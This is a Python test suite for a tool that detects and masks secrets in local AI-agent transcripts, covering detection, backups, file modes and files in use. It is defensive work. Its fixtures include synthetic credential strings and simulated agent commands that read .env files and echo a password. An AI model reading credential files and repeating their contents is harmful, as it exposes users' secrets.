"""Secret detection and masking in local transcripts.

The dangerous failure here is not missing a secret -- it is masking something
that was never one, because the file being rewritten is the user's own agent
history and a bad replacement is silent corruption.
"""
import glob
import io
import json
import ntpath
import os
import random
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import isolated_home  # noqa: E402,F401  ranwhat's state, never ~/.ranwhat
import agents_fixtures as af  # noqa: E402
from ranwhat import clean
from ranwhat.clean import REDACTION, find_secrets, scan, scan_file

# Where a real `clean --apply` puts its backups with RANWHAT_HOME unset.
REAL_BACKUPS = os.path.join(os.path.expanduser("~"), ".ranwhat", "backups")


def n(text):
    return len(find_secrets(text))


class Detection(unittest.TestCase):

    def test_secret_shaped_values(self):
        # Not an alphabet run: that is a fixture, see test_fixtures.py.
        self.assertEqual(n("STRIPE=sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc"), 1)
        self.assertEqual(n("AWS=AKIA" "IOSFODNN7REALKEY"), 1)
        self.assertEqual(n("JWT_ACCESS_SECRET=8f3a9c2e1b7d4f6a0c5e8b2d7f1a4c9e"), 1)

    def test_connection_string_password(self):
        self.assertEqual(n("DATABASE_URL=postgresql://admin:sup3rS3cretPw@db:5432/a"), 1)

    def test_password_inside_a_url_is_not_reported_twice(self):
        """It is already covered by the URL that contains it."""
        found = find_secrets("DATABASE_URL=postgresql://u:pa55word11@h:5432/d")
        self.assertEqual(len(found), 1)

    def test_ordinary_config_is_left_alone(self):
        for text in ("NODE_ENV=production", "PORT=3100",
                     "NEXT_PUBLIC_URL=https://example.com",
                     "LOG_LEVEL=debug"):
            self.assertEqual(n(text), 0, text)

    def test_placeholders_are_not_secrets(self):
        for text in ("API_KEY=your-api-key-here", "TOKEN=replace-with-your-token",
                     "PASSWORD=insert_password_here", "SECRET=enter-your-secret",
                     "JWT_SECRET=changeme", "DATABASE_URL=<redacted>",
                     "KEY=xxxxxxxxxx", "SECRET=${MY_SECRET}"):
            self.assertEqual(n(text), 0, text)

    def test_short_values_are_ignored(self):
        self.assertEqual(n("PASSWORD=abc"), 0)


class OnlyLiteralsAreSecrets(unittest.TestCase):
    """Every case here came from a machine with a real agent history, where
    this rule reported 185 secrets and roughly two thirds were code."""

    def test_environment_references_are_not_values(self):
        for text in ("JWT_SECRET=process.env.JWT_ACCESS_SECRET",
                     "password: process.env.DB_PASSWORD",
                     "secret: os.environ['JWT_SECRET']",
                     "apiKey: import.meta.env.VITE_KEY"):
            self.assertEqual(n(text), 0, text)

    def test_function_calls_are_not_values(self):
        for text in ("const secret = crypto.randomBytes(32)",
                     "token = randomBytes(32).toString('hex')",
                     "secret: Buffer.from(raw)",
                     "token: headers.auth(h)",
                     "TOKEN=$(printf '%s' $x | cli)"):
            self.assertEqual(n(text), 0, text)

    def test_templates_regexes_and_paths(self):
        for text in ("token = `${env}-session-id`",
                     "pattern: token=[A-Z]{20}",
                     "DATABASE_URL=.*|postgres|mysql|",
                     "PWD=/Users/mikica/Desktop/cistimo"):
            self.assertEqual(n(text), 0, text)

    def test_identifiers_and_already_masked_values(self):
        for text in ("token: tokenAddress", "auth: Authorization",
                     "Token=gho_****************************"):
            self.assertEqual(n(text), 0, text)

    def test_low_entropy_prose_is_not_a_secret(self):
        self.assertEqual(n("bad_credentials: rate limit exceeded"), 0)

    def test_real_credentials_still_found(self):
        for text in ("DB_PASSWORD=kzN8fJx2mQ4vB7nR5tY9wL3pZ6aS1dF0c2e=",
                     "SESSION_SECRET=be1c4f7a9d2e6b8c0f3a5d7e9b1c4f6a8d0e2b5c7f9a1d3e6b8c0f2a4d5e6",
                     "APP_KEY=base64:Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZmdoaQ==",
                     "RENDER_API_KEY=zGK7pQ2mV9xR4tN8wL1bY6cF3jH5dS0aE60",
                     "AWS_ACCESS_KEY_ID=AKIA4TRUE7KEYX9QZ2WB",
                     "TURNSTILE_SECRET=0x4AAAAAAABkMYinukE8nzYSjRt2wLpF3Lc",
                     "DATABASE_URL=postgresql://buzz:Xk9mPq2vRt7@db.internal:5432/app"):
            self.assertEqual(n(text), 1, text)


def _read(path):
    with open(path, encoding="utf-8") as fh:
        return fh.read()


def _tempdir(test, prefix):
    d = tempfile.mkdtemp(prefix=prefix)
    test.addCleanup(shutil.rmtree, d, True)
    return d


def _transcript(test, body):
    root = _tempdir(test, "clean-t-")
    d = os.path.join(root, "proj")
    os.makedirs(d)
    path = af.write(os.path.join(d, "s.jsonl"), [json.dumps(
        {"type": "user", "message": {"content": [
            {"type": "tool_result", "content": body}]}})])
    return root, path


class Masking(unittest.TestCase):

    BODY = ("DATABASE_URL=postgresql://admin:sup3rS3cretPw@db:5432/app\n"
            "JWT_ACCESS_SECRET=8f3a9c2e1b7d4f6a0c5e8b2d7f1a4c9e\n"
            "NODE_ENV=production\n")

    def setUp(self):
        # Masking backs a transcript up first. These are synthetic, so their
        # backups go with them, not into the developer's ~/.ranwhat.
        self.backups = _tempdir(self, "clean-backups-")
        patch = mock.patch.object(clean, "BACKUP_ROOT", self.backups)
        patch.start()
        self.addCleanup(patch.stop)

    def _backups_of(self, root, path):
        # Under any stamp, laid out as clean lays it out: on Windows the
        # drive becomes a directory of its own.
        rel = os.path.relpath(clean._backup_dest(root, "stamp", path),
                              os.path.join(root, "stamp"))
        return glob.glob(os.path.join(glob.escape(root), "*",
                                      glob.escape(rel)))

    def test_dry_run_changes_nothing(self):
        root, path = _transcript(self, self.BODY)
        before = _read(path)
        findings, scanned, changed = scan(root=root, apply=False)
        self.assertEqual(len(findings), 2)
        self.assertEqual(changed, [])
        self.assertEqual(_read(path), before)

    def test_apply_masks_and_leaves_valid_json(self):
        root, path = _transcript(self, self.BODY)
        scan(root=root, apply=True)
        text = _read(path)
        for line in text.splitlines():
            if line.strip():
                json.loads(line)          # must still parse
        self.assertNotIn("sup3rS3cretPw", text)
        self.assertNotIn("8f3a9c2e1b7d4f6a0c5e8b2d7f1a4c9e", text)
        self.assertIn("NODE_ENV=production", text)
        self.assertIn("ranwhat:redacted:", text)

    def test_a_backup_is_written_before_changing_anything(self):
        """Of this transcript, by this run: the backup root is new for each
        test, so a copy left by an earlier run cannot pass it."""
        root, path = _transcript(self, self.BODY)
        scan(root=root, apply=True)
        hits = self._backups_of(self.backups, path)
        self.assertEqual(len(hits), 1, "no backup was written")
        self.assertIn("sup3rS3cretPw", _read(hits[0]))

    def test_the_real_backups_directory_is_never_written(self):
        """Every run of this suite used to leave three copies of these
        synthetic transcripts in ~/.ranwhat/backups."""
        root, path = _transcript(self, self.BODY)
        scan(root=root, apply=True)
        self.assertNotEqual(os.path.realpath(clean.BACKUP_ROOT),
                            os.path.realpath(REAL_BACKUPS))
        self.assertEqual(self._backups_of(REAL_BACKUPS, path), [])
        self.assertTrue(self._backups_of(self.backups, path))

    def test_running_twice_is_a_no_op(self):
        """A masked value must not be treated as a new secret to mask."""
        root, path = _transcript(self, self.BODY)
        scan(root=root, apply=True)
        after_first = _read(path)
        findings, _scanned, changed = scan(root=root, apply=True)
        self.assertEqual(findings, {})
        self.assertEqual(changed, [])
        self.assertEqual(_read(path), after_first)

    def test_transcript_without_secrets_is_untouched(self):
        root, path = _transcript(self, "NODE_ENV=production\nPORT=3100\n")
        before = _read(path)
        findings, _s, changed = scan(root=root, apply=True)
        self.assertEqual(findings, {})
        self.assertEqual(changed, [])
        self.assertEqual(_read(path), before)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class WhereDidItComeFrom(unittest.TestCase):
    """A 64-character string is useless without knowing which file it came
    out of and which project that file belongs to."""

    def _project(self, slug, rows):
        root = _tempdir(self, "where-")
        d = os.path.join(root, slug)
        os.makedirs(d)
        with open(os.path.join(d, "s.jsonl"), "w", encoding="utf-8") as fh:
            for r in rows:
                fh.write(json.dumps(r) + "\n")
        return root

    def test_secret_is_attributed_to_the_file_it_was_read_from(self):
        rows = [
            {"message": {"content": [{"type": "tool_use", "name": "Bash",
                                      "input": {"command": "cat api/.env"}}]}},
            {"message": {"content": [{"type": "tool_result",
                "content": "AWS_ACCESS_KEY_ID=AKIA4TRUE7KEYX9QZ2WB\n"}]}},
        ]
        root = self._project("-Users-me-Desktop-app", rows)
        findings, _s, _c = scan(root=root)
        entry = list(findings.values())[0]
        self.assertIn("api/.env", entry["origins"])

    def test_templates_are_not_offered_as_the_origin(self):
        rows = [
            {"message": {"content": [{"type": "tool_use", "name": "Bash",
                                      "input": {"command": "cat .env.example"}}]}},
            {"message": {"content": [{"type": "tool_result",
                "content": "AWS_ACCESS_KEY_ID=AKIA4TRUE7KEYX9QZ2WB\n"}]}},
        ]
        root = self._project("-Users-me-Desktop-app", rows)
        findings, _s, _c = scan(root=root)
        self.assertEqual(list(findings.values())[0]["origins"], set())

    def test_project_slug_resolves_against_the_filesystem(self):
        from ranwhat.clean import project_path
        base = _tempdir(self, "where-slug-")
        os.makedirs(os.path.join(base, "birthday-planner"))
        # Flattened as Claude Code does it: every separator, and the colon
        # after a Windows drive, becomes a dash.
        drive, rest = os.path.splitdrive(base)
        slug = (drive.replace(":", "-") + rest.replace(os.sep, "-")
                + "-birthday-planner")
        self.assertEqual(project_path(slug),
                         os.path.join(base, "birthday-planner"))

    def test_a_windows_slug_resolves_to_a_drive_path(self):
        dirs = {"C:\\", r"C:\Users", r"C:\Users\me",
                r"C:\Users\me\birthday-planner"}
        with mock.patch.object(clean.os, "name", "nt"), \
             mock.patch.object(clean.os, "path", ntpath), \
             mock.patch.object(ntpath, "isdir", dirs.__contains__):
            self.assertEqual(clean.project_path("C--Users-me-birthday-planner"),
                             r"C:\Users\me\birthday-planner")
            self.assertEqual(clean.project_path("C--Users-me-gone-app"),
                             r"C:\Users\me\gone-app")

    def test_a_drive_shaped_slug_is_left_alone_off_windows(self):
        with mock.patch.object(clean.os, "name", "posix"):
            self.assertEqual(clean.project_path("C--Users-me-app"),
                             "C--Users-me-app")

    def test_unknown_slug_keeps_dashes_rather_than_splitting_every_one(self):
        from ranwhat.clean import project_path
        out = project_path("-nonexistent-root-some-project-name")
        self.assertTrue(out.endswith("some-project-name"), out)


class MaskingDoesNotWidenExposure(unittest.TestCase):
    """clean exists to reduce where a secret can be read from. A rewrite
    that loosens the transcript's mode, or a backup anyone can read, makes
    it the opposite."""

    def setUp(self):
        from unittest import mock
        from ranwhat import clean
        self.root = os.path.join(_tempdir(self, "bk-"), "backups")
        patch = mock.patch.object(clean, "BACKUP_ROOT", self.root)
        patch.start()
        self.addCleanup(patch.stop)

    def _backups(self):
        return [os.path.join(base, f) for base, _d, files in os.walk(self.root)
                for f in files]

    @unittest.skipIf(os.name == "nt", "Windows has no owner-only mode bits")
    def test_a_private_transcript_stays_private(self):
        root, path = _transcript(self, Masking.BODY)
        os.chmod(path, 0o600)
        scan(root=root, apply=True)
        self.assertIn("ranwhat:redacted:", _read(path))
        self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)

    @unittest.skipIf(os.name == "nt", "Windows has no owner-only mode bits")
    def test_the_original_mode_is_kept_not_tightened_either(self):
        root, path = _transcript(self, Masking.BODY)
        os.chmod(path, 0o640)
        scan(root=root, apply=True)
        self.assertEqual(os.stat(path).st_mode & 0o777, 0o640)

    @unittest.skipIf(os.name == "nt", "Windows has no owner-only mode bits")
    def test_backups_are_readable_only_by_the_owner(self):
        root, path = _transcript(self, Masking.BODY)
        os.chmod(path, 0o644)
        scan(root=root, apply=True)
        self.assertEqual(os.stat(self.root).st_mode & 0o777, 0o700)
        backups = self._backups()
        self.assertTrue(backups)
        for b in backups:
            self.assertEqual(os.stat(b).st_mode & 0o777, 0o600, b)

    def test_two_masks_in_one_second_keep_the_true_original(self):
        """Masking one finding and then another used to reuse the same
        backup path, so the second backup (already half masked) replaced
        the only unmasked copy."""
        root, path = _transcript(self, Masking.BODY)
        findings, _, _ = scan(root=root, apply=False)
        fps = sorted(findings)
        scan_file(path, apply=True, only={fps[0]})
        scan_file(path, apply=True, only={fps[1]})
        texts = [_read(b) for b in self._backups()]
        self.assertEqual(len(texts), 2)
        self.assertTrue(any("sup3rS3cretPw" in t and "8f3a9c2e" in t for t in texts),
                        "no backup still holds the fully unmasked original")

    def test_two_masks_in_one_clock_tick_keep_the_true_original(self):
        """Microseconds only separate backups if the clock ticks between
        them. On Windows before Python 3.13 it ticks every 1 to 16 ms, and
        O_EXCL refused the second backup with FileExistsError."""
        import datetime

        class Frozen(datetime.datetime):
            @classmethod
            def now(cls, tz=None):
                return cls(2026, 9, 27, 12, 0, 0, 0)

        root, path = _transcript(self, Masking.BODY)
        fps = sorted(scan(root=root, apply=False)[0])
        with mock.patch.object(clean.datetime, "datetime", Frozen):
            scan_file(path, apply=True, only={fps[0]})
            scan_file(path, apply=True, only={fps[1]})
            scan_file(path, apply=True)   # nothing left to mask, no backup
        self.assertEqual(sorted(os.listdir(self.root)),
                         ["20260927-120000-000000", "20260927-120000-000000-1"])
        first = [b for b in self._backups()
                 if os.path.relpath(b, self.root).split(os.sep)[0]
                 == "20260927-120000-000000"]
        text = _read(first[0])
        self.assertTrue("sup3rS3cretPw" in text and "8f3a9c2e" in text,
                        "the first backup is not the unmasked original")

    def test_no_temp_file_is_left_behind(self):
        root, path = _transcript(self, Masking.BODY)
        scan(root=root, apply=True)
        self.assertEqual(os.listdir(os.path.dirname(path)), ["s.jsonl"])

    def test_the_backup_is_the_original_byte_for_byte(self):
        """On Windows a descriptor from os.open is in text mode unless told
        otherwise, and a backup written through one would gain a \\r per
        line."""
        root, path = _transcript(self, Masking.BODY)
        with open(path, "rb") as fh:
            original = fh.read()
        scan(root=root, apply=True)
        backups = self._backups()
        self.assertEqual(len(backups), 1)
        with open(backups[0], "rb") as fh:
            self.assertEqual(fh.read(), original)


class WhereTheBackupGoes(unittest.TestCase):
    """The backup is the transcript's absolute path re-rooted under the
    backup directory. On Windows, joining C:\\... onto the root discarded
    the root, so the "backup" was the transcript itself, and O_EXCL was all
    that stopped clean --apply from truncating it."""

    def test_a_posix_path(self):
        import posixpath
        with mock.patch.object(clean.os, "path", posixpath):
            self.assertEqual(
                clean._backup_dest("/home/me/.ranwhat/backups", "20260927",
                                   "/home/me/.claude/projects/-app/s.jsonl"),
                "/home/me/.ranwhat/backups/20260927/home/me/.claude/projects/"
                "-app/s.jsonl")

    def test_a_windows_drive_becomes_a_directory(self):
        with mock.patch.object(clean.os, "path", ntpath):
            self.assertEqual(
                clean._backup_dest(r"C:\Users\me\.ranwhat\backups", "20260927",
                                   r"C:\Users\me\.claude\projects\C--app\s.jsonl"),
                r"C:\Users\me\.ranwhat\backups\20260927\C\Users\me"
                r"\.claude\projects\C--app\s.jsonl")

    def test_a_windows_share_becomes_directories(self):
        with mock.patch.object(clean.os, "path", ntpath):
            self.assertEqual(
                clean._backup_dest(r"C:\b", "20260927",
                                   r"\\server\share\p\s.jsonl"),
                r"C:\b\20260927\server\share\p\s.jsonl")

    def test_past_max_path_on_windows_it_is_named_whole(self):
        """The backup is the home directory and some forty characters
        longer than the transcript, and past 260 characters Windows opens
        a path only in its \\\\?\\ form: a subagent's transcript in a
        project with a long name could be read and not backed up."""
        transcript = (r"C:\Users\firstname.lastname\.claude\projects\C--Users-"
                      r"firstname-lastname-Documents-GitHub-acme-payments-service"
                      r"\0b8e7a1c-2f3d-4e5f-8a9b-0c1d2e3f4a5b\subagents"
                      r"\agent-a8b3c2d1e0f9a7b6c.jsonl")
        with mock.patch.object(clean.os, "path", ntpath), \
             mock.patch.object(clean.os, "name", "nt"):
            for root, prefix in ((r"C:\Users\firstname.lastname\.ranwhat\backups",
                                  "\\\\?\\C:\\Users\\"),
                                 (r"\\server\share\firstname.lastname\.ranwhat\backups",
                                  "\\\\?\\UNC\\server\\share\\")):
                dest = clean._backup_dest(root, "20261003-170358-563517", transcript)
                self.assertTrue(dest.startswith(prefix), dest)
                self.assertTrue(dest.endswith(transcript[2:]), dest)
            short = clean._backup_dest(r"C:\b", "20260927", r"C:\p\s.jsonl")
            self.assertEqual(short, r"C:\b\20260927\C\p\s.jsonl")


class BackupsGoWhereRanwhatKeepsItsState(unittest.TestCase):
    """Backups went to ~/.ranwhat/backups whatever RANWHAT_HOME said, while
    the index and the feed went under it: a plaintext copy of every masked
    transcript outside the directory the user chose for ranwhat's state."""

    def test_under_ranwhat_home(self):
        state = _tempdir(self, "rw-home-")
        _root, path = _transcript(self, Masking.BODY)
        with mock.patch.object(clean, "BACKUP_ROOT", None), \
             mock.patch.dict(os.environ, {"RANWHAT_HOME": state}):
            dest = clean._backup(path)
        self.assertTrue(dest.startswith(os.path.join(state, "backups") + os.sep), dest)
        self.assertEqual(_read(dest), _read(path))

    def test_the_report_names_that_directory(self):
        state = _tempdir(self, "rw-home-")
        finding = {"fingerprint": "f" * 12, "label": "DB_PASSWORD", "length": 16,
                   "hint": "Qm…z", "files": {"/p/s.jsonl"}, "origins": set(),
                   "projects": {"/p"}, "count": 1}
        with mock.patch.object(clean, "BACKUP_ROOT", None), \
             mock.patch.dict(os.environ, {"RANWHAT_HOME": state, "NO_COLOR": "1",
                                          "RANWHAT_WIDTH": "200"}):
            text = clean.render({finding["fingerprint"]: finding}, 1,
                                ["/p/s.jsonl"], True)
        self.assertIn("Backups: %s" % os.path.join(state, "backups"), text)


class RewriteKeepsEveryByteItDoesNotMask(unittest.TestCase):
    """Only the secret changes. Reading in text mode turned \\r\\n into \\n
    on every line of a rewritten transcript, and the locale's encoding
    (cp1252 on Windows) would have mangled everything outside ASCII."""

    SECRET = "8f3a9c2e1b7d4f6a0c5e8b2d7f1a4c9e"

    def setUp(self):
        backups = os.path.join(_tempdir(self, "bk-"), "backups")
        patch = mock.patch.object(clean, "BACKUP_ROOT", backups)
        patch.start()
        self.addCleanup(patch.stop)

    def _line(self, text):
        return json.dumps({"type": "user", "message": {"content": [
            {"type": "tool_result", "content": text}]}}, ensure_ascii=False)

    def _apply(self, lines):
        original = lines if isinstance(lines, bytes) else "".join(lines).encode("utf-8")
        path = af.write(os.path.join(_tempdir(self, "bytes-"), "s.jsonl"), original)
        findings, changed = scan_file(path, apply=True)
        self.assertTrue(changed)
        (fp,) = findings
        with open(path, "rb") as fh:
            after = fh.read()
        return original, after, (REDACTION % fp).encode("utf-8")

    def test_crlf_and_text_beyond_ascii_survive(self):
        lines = [self._line("Café ≠ café, 日本語 ✓") + "\r\n",
                 self._line("JWT_ACCESS_SECRET=%s naïve" % self.SECRET) + "\r\n",
                 self._line("Ωmega, untouched") + "\n",
                 self._line("last line, no ending ✓")]
        original, after, mask = self._apply(lines)
        self.assertEqual(after, original.replace(self.SECRET.encode(), mask))

    def test_a_masked_last_line_gains_no_ending(self):
        lines = [self._line("first ✓") + "\n",
                 self._line("JWT_ACCESS_SECRET=%s" % self.SECRET)]
        original, after, mask = self._apply(lines)
        self.assertEqual(after, original.replace(self.SECRET.encode(), mask))

    def test_half_an_emoji_is_written_back_as_the_escape_it_was_read_as(self):
        """Node writes a string cut inside an emoji with the half it kept
        as an escape, \\ud83d. json reads that as a lone surrogate, which
        UTF-8 cannot write, and clean --apply ended in a traceback."""
        lines = [self._line("JWT_ACCESS_SECRET=%s café, cut @" % self.SECRET)
                 .replace("@", "\\ud83d") + "\n",
                 self._line("untouched @").replace("@", "\\udfff") + "\n"]
        original, after, mask = self._apply(lines)
        self.assertEqual(after, original.replace(self.SECRET.encode(), mask))

    def test_a_byte_that_is_not_utf8_is_kept_on_a_line_with_no_secret(self):
        """Read as U+FFFD, it was written back as one: three bytes in
        place of the one the file held."""
        lines = (self._line("café notes").encode("utf-8").replace(b"\xc3\xa9", b"\xe9")
                 + b"\n" + self._line("JWT_ACCESS_SECRET=%s" % self.SECRET).encode()
                 + b"\n")
        original, after, mask = self._apply(lines)
        self.assertEqual(after, original.replace(self.SECRET.encode(), mask))


class ATranscriptStillBeingWritten(unittest.TestCase):
    """A Claude Code transcript was rewritten however recently it had been
    written to, and whatever was appended to it while it was read: a turn
    a live session wrote in that time was in neither the masked file nor
    its backup. It is left as it is, as every other agent's file is, and
    the report says why."""

    def setUp(self):
        self.backups = os.path.join(_tempdir(self, "bk-"), "backups")
        patch = mock.patch.object(clean, "BACKUP_ROOT", self.backups)
        patch.start()
        self.addCleanup(patch.stop)

    def _backups(self):
        return [f for _base, _d, files in os.walk(self.backups) for f in files]

    def _masked(self, path):
        return "ranwhat:redacted:" in _read(path)

    def test_one_written_in_the_last_two_minutes_is_left_as_it_is(self):
        root, path = _transcript(self, Masking.BODY)
        now = af.write(os.path.join(root, "proj", "now.jsonl"), _read(path), age=0)
        before = _read(now)
        searched = clean.scan_sources(sources=["claude-code"], root=root, apply=True)
        self.assertEqual(_read(now), before)
        self.assertEqual(searched.skipped, {now: ("claude-code", "in use")})
        self.assertEqual(searched.changed, [path])
        self.assertEqual(len(self._backups()), 1)

    def test_one_written_to_while_it_is_read_is_left_as_it_is(self):
        root, path = _transcript(self, Masking.BODY)
        turn = json.dumps({"type": "user", "message": {"content": "next turn"}}) + "\n"
        backup = clean._backup

        def append_after_backup(p):
            dest = backup(p)
            with open(p, "a", encoding="utf-8") as fh:
                fh.write(turn)
            return dest
        skipped = {}
        with mock.patch.object(clean, "_backup", append_after_backup):
            _findings, changed = scan_file(path, apply=True, skipped=skipped)
        self.assertFalse(changed)
        self.assertEqual(skipped, {path: "changed while reading"})
        self.assertTrue(_read(path).endswith(turn))
        self.assertFalse(self._masked(path))
        self.assertEqual(self._backups(), [])

    def test_a_second_mask_in_one_run_is_not_held_back_by_the_first(self):
        """The first mask is ranwhat's own write, not the agent's."""
        root, path = _transcript(self, Masking.BODY)
        fps = sorted(scan(root=root)[0])
        for fp in fps:
            skipped = {}
            _findings, changed = scan_file(path, apply=True, only={fp}, skipped=skipped)
            self.assertTrue(changed, skipped)
        self.assertEqual(scan(root=root)[0], {})

    def test_one_windows_will_not_replace_is_in_use_and_the_rest_go_on(self):
        """os.replace refuses a file another process holds open on Windows.
        That ended clean --apply in a traceback before any later file was
        masked, and left a backup holding the secret though nothing was
        masked."""
        from ranwhat.sources import _rewrite
        root, held = _transcript(self, Masking.BODY)
        other = af.write(os.path.join(root, "proj", "other.jsonl"), _read(held))
        replace = os.replace

        def refuse(src, dst):
            if dst == held:
                raise PermissionError(13, "in use by another process")
            return replace(src, dst)
        with mock.patch.object(_rewrite, "_WINDOWS", True), \
             mock.patch.object(os, "replace", refuse):
            searched = clean.scan_sources(sources=["claude-code"], root=root,
                                          apply=True)
        self.assertEqual(searched.skipped, {held: ("claude-code", "in use")})
        self.assertEqual(searched.changed, [other])
        self.assertFalse(self._masked(held))
        self.assertTrue(self._masked(other))
        self.assertEqual(len(self._backups()), 1)
        self.assertEqual(os.listdir(os.path.dirname(held)).count(
            os.path.basename(held) + _rewrite.TMP_SUFFIX), 0)

    def test_one_that_cannot_be_backed_up_is_not_written(self):
        """A backup path past Windows' MAX_PATH raised out of clean --apply."""
        root, path = _transcript(self, Masking.BODY)
        err = io.StringIO()
        with mock.patch.object(clean, "_backup",
                               side_effect=OSError(36, "File name too long")), \
             mock.patch("sys.stderr", err):
            searched = clean.scan_sources(sources=["claude-code"], root=root,
                                          apply=True)
        self.assertEqual(searched.skipped, {path: ("claude-code", clean.NOT_WRITTEN)})
        self.assertEqual(searched.changed, [])
        self.assertFalse(self._masked(path))
        self.assertIn("could not mask", err.getvalue())

    def test_the_review_says_why_it_left_one(self):
        root, path = _transcript(self, Masking.BODY)
        os.utime(path)
        findings, scanned, _ = scan(root=root)
        replies = iter(("mask 1", "quit"))
        out = io.StringIO()
        with mock.patch("builtins.input", lambda prompt="": next(replies)), \
             mock.patch.dict(os.environ, {"RANWHAT_WIDTH": "80"}):
            changed = clean.review(findings, scanned, stream=out)
        self.assertEqual(changed, 0)
        self.assertFalse(self._masked(path))
        self.assertIn("1 file in use, not masked. Run clean --apply again once "
                      "Claude Code is closed,", " ".join(out.getvalue().split()))


class InteractiveReview(unittest.TestCase):
    """`ranwhat clean` on a terminal with findings and no --apply lands in
    review(). A mask there rewrote the file and then died on a NameError
    printing the backup note, so the session ended in a traceback."""

    def setUp(self):
        self.backups = os.path.join(_tempdir(self, "bk-"), "backups")
        patch = mock.patch.object(clean, "BACKUP_ROOT", self.backups)
        patch.start()
        self.addCleanup(patch.stop)

    def _review(self, *commands):
        root, path = _transcript(self, Masking.BODY)
        findings, scanned, _ = scan(root=root, apply=False)
        replies = iter(commands)
        out = io.StringIO()
        with mock.patch("builtins.input", lambda prompt="": next(replies)):
            changed = clean.review(findings, scanned, stream=out)
        return path, changed, out.getvalue()

    def test_mask_one_finishes_and_counts_the_file(self):
        path, changed, out = self._review("mask 1", "quit")
        self.assertEqual(changed, 1)
        self.assertIn("masked in 1 file(s).", out)
        self.assertIn("They still hold every masked value.", out)
        self.assertEqual(_read(path).count(
            "ranwhat:redacted:"), 1)

    def test_mask_all_finishes_and_counts_the_file(self):
        path, changed, out = self._review("mask all", "quit")
        self.assertEqual(changed, 1)
        self.assertIn("masked in 1 file(s).", out)
        text = _read(path)
        self.assertNotIn("sup3rS3cretPw", text)
        self.assertNotIn("8f3a9c2e1b7d4f6a0c5e8b2d7f1a4c9e", text)

    def test_masks_add_up_across_commands(self):
        _path, changed, _out = self._review("mask 1", "mask 1", "quit")
        self.assertEqual(changed, 2)


class _AgentsHome(unittest.TestCase):
    """A home that holds no agent's own history, with backups beside it.
    Every value is synthetic."""

    TOKEN = "gh" "p_" "Zq8Lm3Np5Rt7Vx9Bc2Df4Gh6Jk1Wy0Ea3Su"
    PASSWORD = "Vq7Lx2Rk9Tz4Wm8Pn3"

    def setUp(self):
        from ranwhat.sources import _paths
        self.home = _tempdir(self, "review-agents-")
        self.backups = os.path.join(self.home, "backups")
        for patch in (mock.patch.dict(os.environ, {"HOME": self.home,
                                                   "USERPROFILE": self.home,
                                                   "NO_COLOR": "1",
                                                   "RANWHAT_WIDTH": "80"}),
                      mock.patch.object(_paths, "home", return_value=self.home),
                      mock.patch.object(clean, "BACKUP_ROOT", self.backups)):
            patch.start()
            self.addCleanup(patch.stop)
        for name in af.AGENT_ENV:
            os.environ.pop(name, None)          # restored by patch.dict


class ReviewingAnotherAgentsFiles(_AgentsHome):
    """What the review says when it masks a finding in another agent's
    files, and what it keeps for later."""

    def _review(self, agent, root, *commands):
        searched = clean.scan_sources(sources=[agent.id], paths={agent.id: root})
        replies = iter(commands + ("list", "quit"))
        out = io.StringIO()
        with mock.patch("builtins.input", lambda prompt="": next(replies)):
            clean.review(searched.findings, searched.scanned, stream=out,
                         values=searched.values, stores=searched.stores)
        return " ".join(out.getvalue().split())

    def _codex(self, age):
        codex = af.AGENTS[0]
        root = codex.root(self.home)
        rollout = codex.write(root, [("c1", "shell", "cat .env",
                                      "GITHUB_TOKEN=%s\n" % self.TOKEN, time.time() - age)],
                              age=age)
        return codex, root, rollout

    def test_a_file_in_use_beside_a_read_only_one_is_not_called_read_only(self):
        codex, root, _rollout = self._codex(10)
        codex.read_only(root, self.TOKEN)
        out = self._review(codex, root, "mask 1")
        self.assertNotIn("every file that holds it is read only", out)
        self.assertIn("nothing changed.", out)
        self.assertIn("1 file in use, not masked.", out)

    def test_a_finding_left_in_use_stays_in_the_list(self):
        codex, root, _rollout = self._codex(10)
        out = self._review(codex, root, "mask 1")
        self.assertIn("in use, not masked", out)
        self.assertIn("1 GitHub personal access token",
                      out.split("in use, not masked")[1])

    def test_one_held_by_a_codex_lock_says_so(self):
        """A rollout a Codex thread holds was said to be in use until two
        minutes after it was last written, though it was a day old: the
        lock lasts as long as Codex holds the thread, or, left by a crash,
        until Codex next starts."""
        from ranwhat.sources import codex as codex_source
        codex, root, rollout = self._codex(86400)
        thread = af._uuid("codex", ord("a"))
        af.write(os.path.join(root, codex_source.LOCK_DIR, thread + ".lock"), "")
        searched = clean.scan_sources(sources=["codex"], paths={"codex": root},
                                      apply=True)
        self.assertEqual(searched.skipped, {rollout: ("codex", clean.HELD_OPEN)})
        text = " ".join(clean.render(searched.findings, searched.counts,
                                     searched.changed, True, others=searched.others,
                                     skipped=searched.skipped).split())
        self.assertIn("1 file held open by Codex, not masked.", text)
        self.assertNotIn("two minutes", text)

    def test_masking_says_what_the_agent_may_do_next(self):
        """The note an agent's adapter gives after a mask (that an open
        Gemini CLI may write the value back) was printed by clean --apply
        and never by the review."""
        gemini = af.AGENTS[1]
        root = gemini.root(self.home)
        gemini.write(root, [("g1", "shell", "cat .env",
                             "GITHUB_TOKEN=%s\n" % self.TOKEN, time.time() - 3600)])
        out = self._review(gemini, root, "mask 1")
        self.assertIn("masked in 1 file(s).", out)
        self.assertIn("If Gemini CLI is open in this project, close it first", out)
        self.assertNotIn(self.TOKEN, out)


class CopiesInAnotherAgentsFiles(_AgentsHome):
    """A value is counted and masked in an agent's file wherever it is,
    as in a Claude Code transcript."""

    def _claude(self, rows):
        root = os.path.join(self.home, "claude")
        af.write(os.path.join(root, "-tmp-app", "s.jsonl"), [json.dumps(r) for r in rows])
        return root

    def test_seen_as_often_in_a_rollout_as_in_a_transcript(self):
        """The same two calls, a .env read and the password echoed, were
        seen 2x in a Claude Code transcript and 1x in a Codex rollout."""
        calls = [("c1", "shell", "cat api/.env", "DB_PASSWORD=%s\n" % self.PASSWORD,
                  time.time() - 3000),
                 ("c2", "shell", "echo %s > y" % self.PASSWORD, "", time.time() - 2990)]
        codex = af.AGENTS[0]
        root = codex.root(self.home)
        codex.write(root, calls)
        claude = self._claude([
            {"type": "assistant", "message": {"content": [
                {"type": "tool_use", "id": cid, "name": "Bash",
                 "input": {"command": command}}]}} for cid, _k, command, _o, _w in calls]
